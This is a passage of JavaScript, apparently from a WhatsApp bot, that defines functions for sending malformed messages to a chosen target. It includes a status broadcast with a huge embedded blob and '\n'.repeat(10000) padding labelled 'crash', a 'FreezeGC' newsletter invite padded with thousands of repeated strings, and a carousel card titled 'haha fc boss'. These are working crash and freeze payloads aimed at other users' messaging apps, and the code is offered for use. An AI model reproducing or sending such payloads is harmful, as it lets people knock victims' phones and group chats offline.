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",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "@andre crash"
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {   
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
return msg.key; // balikin key biar bisa dihapus
}
        async function FreezeGC(target) {
       sock.relayMessage(target, {
             newsletterAdminInviteMessage: {
           newsletterJid: "120363400307044967@newsletter",
           newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + "GabutDoang".repeat(9000),
           caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + "GabutDoang".repeat(9000),
           inviteExpiration: "0",
          },
          }, {
            userJid: target
       })
       }
async function hapusbug(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: 'anre' 
          },
          footer: { 
            text: 'andre' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'haha fc boss',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "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